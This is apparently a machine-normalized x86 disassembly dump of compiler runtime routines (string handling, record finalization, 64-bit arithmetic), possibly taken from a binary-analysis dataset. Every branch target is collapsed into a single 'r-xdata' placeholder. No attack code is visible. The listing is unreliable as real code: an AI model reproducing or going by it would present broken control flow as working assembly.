sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_407290
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_4071e4
not ecx
sub_407334
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
push esi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4073e6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp ebx 0xff
jle r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx 0xff
call sub_407400
cmp ebx eax
jg r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
test eax eax
jne r-xdata
mov eax ebx
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
push eax
lea eax [ ebp - 0x204 ]
mov ecx [ ebp - 0x4 ]
mov edx 0x1ff
call sub_406a00
test eax eax
jge r-xdata
xor eax eax
jmp r-xdata
cmp ebx eax
jge r-xdata
xor eax eax
jmp r-xdata
mov [ esi ] al
test eax eax
jle r-xdata
mov eax ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4073ed
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea edx [ esi + 0x1 ]
lea ecx [ ebp - 0x204 ]
xchg ecx eax
call sub_4043c8
sub_40740c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_4068a0
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_407a9c
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0xa ] 0x2
je r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
push 0x0
mov eax esp
mov edx [ ebx ]
call sub_4072ac
pop edi
mov eax edi
mov edx esi
xchg [ ebx ] edi
shl ecx 0x1
call sub_4043c8
mov ecx esi
sub eax 0xc
add edx edx
jo r-xdata
jmp sub_4054b8
add edx 0xe
jo r-xdata
push eax
mov eax esp
call sub_404238
pop eax
add eax 0xc
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ eax + esi * 2 ] 0x0
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
mov eax esp
call sub_4068a0
pop edi
jmp r-xdata
sub_4074a4
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_4070a8
push ebx
push esi
push edi
mov ebx eax
mov esi edx
cmp esi ecx
je r-xdata
cmp [ ecx - 0xa ] 0x2
je r-xdata
cmp [ ecx - 0xa ] 0x2
je r-xdata
mov edi [ ecx - 0x4 ]
mov edx edi
shl edx 0x1
test edx 0xc0000000
jne r-xdata
mov eax ebx
xor edx edx
call sub_406a60
mov ecx eax
mov eax ebx
push 0x0
cmp [ esi - 0xa ] 0x2
je r-xdata
call sub_406a60
mov edi eax
mov ecx eax
jmp sub_4054b8
call sub_40740c
mov eax [ ebx ]
mov ecx edi
push 0x0
jmp r-xdata
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
test edx 0xc0000000
jne r-xdata
mov edi ecx
mov eax esi
mov [ esp ] esi
call j_sub_406bfc
mov eax esp
call sub_406a60
mov esi [ esp ]
mov ecx edi
mov edx [ ebx ]
shl edi 0x1
add edx edi
shl ecx 0x1
call sub_4043c8
mov eax esp
mov edx [ eax ]
test edx edx
je r-xdata
mov eax ebx
call sub_40740c
mov eax esi
mov ecx [ esi - 0x4 ]
pop eax
pop edi
pop esi
pop ebx
retn
call sub_4068a0
sub_407564
test edx edx
je r-xdata
mov edx ecx
jmp sub_4070a8
test ecx ecx
je sub_4070a8
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_4074a4
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
push 0x0
push 0x0
cmp [ esi - 0xa ] 0x2
je r-xdata
push eax
push ecx
call sub_4070a8
pop edx
pop eax
jmp sub_4074a4
cmp [ ebx - 0xa ] 0x2
je r-xdata
mov [ esp ] esi
mov eax esi
call j_sub_406bfc
mov eax esp
call sub_406a60
mov esi [ esp ]
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
test eax 0xc0000000
jne r-xdata
mov [ esp + 0x4 ] ebx
mov eax ebx
call j_sub_406bfc
lea eax [ esp + 0x4 ]
call sub_406a60
mov ebx [ esp + 0x4 ]
jmp sub_4054b8
call sub_407a9c
mov edi eax
mov edx edi
mov eax ebx
mov ecx [ ebx - 0x4 ]
shl ecx 0x1
call sub_4043c8
mov eax esi
mov ecx [ esi - 0x4 ]
shl ecx 0x1
mov edx [ ebx - 0x4 ]
shl edx 0x1
add edx edi
call sub_4043c8
mov eax [ esp ]
or eax [ esp + 0x4 ]
je r-xdata
pop eax
pop eax
pop eax
mov edx edi
test edi edi
je r-xdata
mov edx 0x2
mov eax esp
call sub_4068c4
call sub_4070a8
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_407648
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
push 0x0
mov ecx [ ebp + edx * 4 + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ecx - 0xa ] 0x2
je r-xdata
dec edx
jne r-xdata
cmp [ eax ] ecx
jne r-xdata
mov esi eax
mov eax [ ebp + edx * 4 + 0x4 ]
call j_sub_406bfc
mov edx ebx
lea eax [ ebp + edx * 4 + 0x4 ]
call sub_406a60
mov ecx eax
mov edx ebx
mov [ esp ] eax
mov eax esi
push 0x0
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
cmp [ ecx - 0xa ] 0x2
je r-xdata
call sub_407a9c
push eax
mov esi eax
mov edx eax
mov eax [ ebp - 0x18 ]
mov esi [ edi - 0x4 ]
call sub_40740c
mov edi [ ebp - 0x18 ]
push [ edi ]
shl esi 0x1
add esi [ edi ]
dec ebx
jmp r-xdata
mov ecx [ ebp + edx * 4 + 0x4 ]
test ecx ecx
je r-xdata
add eax [ ecx - 0x4 ]
test eax 0xc0000000
jne r-xdata
mov esi eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + edx * 4 + 0x4 ]
call j_sub_406bfc
mov edx [ ebp - 0x4 ]
lea eax [ ebp + edx * 4 + 0x4 ]
call sub_406a60
mov edx [ ebp - 0x4 ]
mov ecx eax
mov [ esp ] eax
mov eax esi
dec ebx
jne r-xdata
mov edx esi
test eax eax
je r-xdata
mov eax [ ebp + ebx * 4 + 0x4 ]
test eax eax
je r-xdata
jmp sub_4054b8
cmp edi ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax edx
neg eax
lea eax [ ebp + eax * 4 - 0x18 ]
call sub_4068c4
pop edx
mov eax [ ebp - 0x18 ]
test edi edi
jne r-xdata
mov ecx [ eax - 0x4 ]
shl ecx 0x1
add esi ecx
call sub_4043c8
xor edi edi
mov edx [ ebp - 0x14 ]
lea esp [ esp + edx * 4 ]
pop eax
pop edx
pop edi
pop esi
pop ebx
pop eax
pop ebp
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_4070a8
dec [ edx - 0x8 ]
sub_407768
cmp eax edx
je r-xdata
retn
test eax edx
je r-xdata
test eax eax
je r-xdata
cmp [ eax - 0xa ] 0x2
jne r-xdata
cmp eax edx
test edx edx
jne r-xdata
xchg edx eax
cmp [ edx - 0xa ] 0x2
jne r-xdata
push 0x0
push eax
lea eax [ esp + 0x4 ]
call sub_4072ac
pop eax
mov edx [ esp ]
call sub_407768
pop eax
pushf
sub eax 0xc
call sub_404220
popf
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
add ecx ecx
add eax ecx
add edx ecx
neg ecx
push ebx
pop ebx
retn
add ecx 0x4
js r-xdata
mov ebx [ ecx + eax ]
cmp ebx [ ecx + edx ]
jne r-xdata
xor eax eax
sub_4077d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_407891
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp ebx 0x1
jge r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test esi esi
jge r-xdata
mov ebx eax
mov edi eax
sub edi ebx
cmp esi edi
jge r-xdata
xor edi edi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi esi
mov ax 0x2
mov eax [ ebp - 0x4 ]
sub eax 0xa
movzx eax [ eax ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx ebx
mov eax [ ebp + 0x8 ]
mov ecx edi
call sub_4071d4
mov edx ebx
add edx edx
add edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx edi
call sub_4071e4
jmp r-xdata
movzx eax ax
cmp eax 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407898
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4078a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call j_sub_407a40
mov eax [ ebx ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp esi 0x1
jl r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebx ]
mov eax ebx
call sub_406a50
pop edi
pop esi
pop ebx
retn
cmp eax esi
jl r-xdata
test edi edi
jle r-xdata
dec esi
mov edx eax
sub edx esi
sub edx edi
mov edi edx
test edi edi
jge r-xdata
mov edx [ ebx ]
lea edx [ edx + esi * 2 ]
sub eax edi
mov ecx [ ebx ]
lea eax [ ecx + eax * 2 ]
mov ecx edi
add ecx ecx
call sub_4043c8
lea edx [ edi + esi ]
mov eax ebx
call sub_40740c
xor edi edi
sub_407914
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_407a32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
test esi esi
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407a39
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebx ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edi eax
cmp [ ebp - 0x8 ] 0x1
jge r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebx ]
mov eax ebx
call sub_406a50
dec [ ebp - 0x8 ]
cmp edi [ ebp - 0x8 ]
jge r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
cmp eax [ ebp - 0x4 ]
sete [ ebp - 0xd ]
lea eax [ esi + edi ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebp - 0x8 ] edi
mov eax ebx
mov edx [ ebp - 0xc ]
call sub_40740c
cmp edi [ ebp - 0x8 ]
jle r-xdata
call sub_4054b8
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
add eax esi
mov edx [ ebx ]
lea edx [ edx + eax * 2 ]
mov eax [ ebx ]
mov ecx [ ebp - 0x8 ]
lea eax [ eax + ecx * 2 ]
sub edi [ ebp - 0x8 ]
mov ecx edi
add ecx ecx
call sub_4043c8
mov eax [ ebx ]
mov edx [ ebp - 0x8 ]
lea edx [ eax + edx * 2 ]
mov ecx esi
add ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4043c8
mov eax [ ebx ]
mov edx [ ebp - 0x8 ]
lea edx [ eax + edx * 2 ]
mov ecx esi
add ecx ecx
call sub_4043c8
jmp r-xdata
sub_407a40
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx - 0xa ] 0x2
je r-xdata
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push eax
call sub_406a48
pop eax
mov edx [ eax ]
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_407a9c
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
shl ecx 0x1
call sub_4043c8
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0xc ]
call sub_404220
sub_407a9c
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax eax
jo r-xdata
jmp sub_4054b8
add eax 0xe
jo r-xdata
call sub_404204
add eax 0xc
pop edx
mov [ eax - 0x8 ] 0x1
mov [ eax - 0x4 ] edx
mov [ eax + edx * 2 ] 0x0
mov [ eax - 0xa ] 0x2
movzx edx [ rw-data ]
mov [ eax - 0xc ] dx
retn
sub_407ae0
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov ax [ esi ]
add esi 0x2
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
shr eax 0x1
mov ecx ebx
jmp r-xdata
sub_407b2c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_407d0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx ]
mov [ ebp - 0x10 ] edi
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movzx eax [ rw-data ]
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x10 ]
sub eax 0xc
movzx eax [ eax ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp si ax
jne r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
test al al
jne r-xdata
test eax eax
sete al
sub eax 0x4
mov eax [ eax ]
mov edx [ ebx ]
mov eax ebx
xor ecx ecx
call sub_406a80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407d11
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax ebx
call j_sub_406c24#2
mov edi [ ebx ]
mov [ ebp - 0x10 ] edi
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
mov ax 0x1
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x10 ]
sub eax 0xa
movzx eax [ eax ]
jmp r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebx ]
mov eax ebx
xor ecx ecx
call sub_406a80
lea eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_4070fc
lea eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_4072ac
jmp r-xdata
cmp ax 0x1
jne r-xdata
mov eax [ ebx ]
sub eax 0xc
mov [ eax ] si
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push edi
movzx eax si
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
mov ecx eax
xor edx edx
xor eax eax
call sub_4069d4
mov edi eax
mov eax ebx
xor ecx ecx
mov edx edi
call sub_406c8c
test edi edi
jle r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
mov edx [ ebx ]
mov eax ebx
xor ecx ecx
call sub_406a80
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0xc ]
push eax
movzx eax si
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov eax [ ebx ]
call sub_406c0c
mov edx edi
pop ecx
call sub_4069d4
jmp r-xdata
mov eax [ ebp - 0xc ]
sub eax 0x4
mov eax [ eax ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_407d18
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_407d4c
add esi 0x8
dec edi
jg r-xdata
sub_407d4c
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_407d4c
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_407d18
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
cmp al 0x12
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_404360
sub_407df0
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_407e40
add esi 0x8
dec edi
jg r-xdata
sub_407e40
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0x12
je r-xdata
mov edx ecx
call sub_4068c4
jmp r-xdata
call sub_4068a0
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call j_sub_4068c4
jmp r-xdata
call j_sub_4068a0
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
mov edx ecx
call sub_406d6c
jmp r-xdata
call sub_406d54
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_407e28
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_407e40
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_407df0
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_409cb4
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_408928
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_404360
sub_407f74
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
test ebp ebp
je r-xdata
sub ecx eax
jle r-xdata
push ecx
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4043c8
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4043c8
mov edx [ eax + esi ]
add eax ebx
call sub_4068f4
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_406d90
mov eax 0x4
jmp r-xdata
cmp cl 0x12
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
mov edx [ eax + esi ]
add eax ebx
call sub_4070a8
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_407f5c
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_4080b4
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_407f74
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_409ccc
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_408964
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_404360
sub_4080b4
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4068f4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_406d90
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x12
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4070a8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
call sub_407f5c
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
mov ecx [ ecx ]
push [ edi + 0x4 ]
call sub_4080b4
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_407f74
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_409ccc
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_408964
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_404360
sub_408220
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_406bfc
xor eax eax
push ebp
push sub_408290
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x1
je r-xdata
lea edx [ ebp - 0x8 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
xchg edx eax
call sub_406e54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_408297
lea eax [ ebp - 0x4 ]
call sub_4068a0
retn
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_406a80
sub_4082a8
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_4082cc
push ebx
push esi
push edi
mov ebx [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov esi edx
mov edi ecx
sar esi 0x1f
xor eax esi
xor edx esi
sub eax esi
sbb edx esi
sar edi 0x1f
xor esi edi
xor ebx edi
xor ecx edi
sub ebx edi
sbb ecx edi
jne r-xdata
sub esp 0xc
mov [ esp ] eax
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] edx
mov edi ecx
shr edx 0x1
rcr eax 0x1
ror edi 0x1
rcr ebx 0x1
bsr ecx ecx
shrd ebx edi cl
shrd eax edx cl
shr edx cl
rol edi 0x1
div ebx
mov ebx [ esp ]
mov ecx eax
imul edi eax
mul [ esp + 0x4 ]
add edx edi
sub ebx eax
mov eax ecx
mov ecx [ esp + 0x8 ]
sbb ecx edx
sbb eax 0x0
xor edx edx
add esp 0xc
cmp edx ebx
jb r-xdata
div ebx
mov edx ecx
jmp r-xdata
mov ecx eax
mov eax edx
xor edx edx
div ebx
xchg ecx eax
xor eax esi
xor edx esi
sub eax esi
sbb edx esi
pop edi
pop esi
pop ebx
retn 0x8
sub_408360
push ebp
push ebx
push esi
push edi
xor edi edi
mov ebx [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
or ecx ecx
jne r-xdata
or edx edx
jns r-xdata
or edx edx
je r-xdata
or ecx ecx
jns r-xdata
neg edx
neg eax
sbb edx 0x0
or edi 0x1
div ebx
xchg edx eax
xor edx edx
jmp r-xdata
or ebx ebx
je r-xdata
mov ebp ecx
mov ecx 0x40
push edi
xor edi edi
xor esi esi
neg ecx
neg ebx
sbb ecx 0x0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
loop r-xdata
ja r-xdata
shl eax 0x1
rcl edx 0x1
rcl esi 0x1
rcl edi 0x1
cmp edi ebp
jb r-xdata
mov eax esi
mov edx edi
pop ebx
test ebx 0x1
je r-xdata
sub esi ebx
sbb edi ebp
inc eax
cmp esi ebx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
sub_4083dc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_40873e
push [ fs : eax ]
